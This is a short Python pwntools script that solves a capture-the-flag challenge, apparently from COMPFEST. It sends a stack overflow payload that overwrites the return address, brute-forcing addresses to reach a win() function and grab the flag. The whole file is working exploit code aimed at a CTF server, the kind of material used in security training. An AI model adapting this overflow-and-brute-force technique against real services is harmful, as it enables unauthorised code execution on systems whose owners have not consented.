from pwn import *

context.binary = './chall'
context.log_level = 'info'

HOST, PORT = 'ctf.compfest.id', 7004
offset = 24  # ubah jika offset ke RIP beda

def try_addr(addr):
    try:
        io = remote(HOST, PORT)
        payload = b"A" * offset + p64(addr)
        io.sendline(payload)
        result = io.recv(timeout=2)
        if result and (b'flag' in result or b'COMPFEST' in result or b'CTF' in result):
            log.success(f"[+] Found possible win() address: {hex(addr)}")
            log.success(f"[+] Output: {result}")
            io.interactive()
            return True
        else:
            io.close()
            return False
    except Exception as e:
        return False

# Bruteforce address range
for addr in range(0x401000, 0x404000, 0x10):
    log.info(f"Trying address: {hex(addr)}")
    if try_addr(addr):
        break
